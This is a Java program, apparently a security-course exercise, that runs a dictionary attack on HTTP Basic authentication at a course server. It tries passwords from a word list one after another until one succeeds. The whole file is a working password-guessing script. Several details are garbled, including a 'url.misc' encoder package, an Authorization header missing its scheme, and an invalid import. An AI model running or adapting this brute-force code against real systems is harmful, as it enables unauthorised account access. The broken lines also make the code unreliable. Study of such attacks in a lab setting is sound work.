

import java.net.*;
import java.io.*;
import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.IOException;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.util.*;
import java.*;


public class Dictionary {
    public static void main(String[] args) throws Exception {
        String pass;
        int attempt = 0;
        String fileName = "words.txt", line;
        BufferedReader reader;
        Dictionary dict = new Dictionary();
        boolean flag=false;

        System.out.println(System.currentTimeMillis()/1000);

      try{
        reader = new BufferedReader(new InputStreamReader(new FileInputStream(fileName)));
        while (!flag)
        {
            try{
               line = reader.readLine();
               attempt++;
               URL url = new URL("http://sec-crack.cs.rmit.edu./SEC/2/");
               URLConnection yc = url.openConnection();
               pass = ":" + line;
               String password = new url.misc.BASE64Encoder().encode(pass.getBytes());
               yc.setRequestProperty("Authorization"," "+password);
               BufferedReader in = new BufferedReader(new InputStreamReader(yc.getInputStream()));
               String inputLine;
               while ((inputLine = in.readLine()) != null)
                   System.out.println(inputLine);
               in.close();
               System.out.println(pass);
               flag=true;
               System.out.println(System.currentTimeMillis()/1000); 
               System.out.println(" of attempt: "+attempt);
               System.exit(0);
             }catch(IOException e){
                
             }
        }  
      }catch(FileNotFoundException e){
         System.out.println("File not found");

      }
    }
}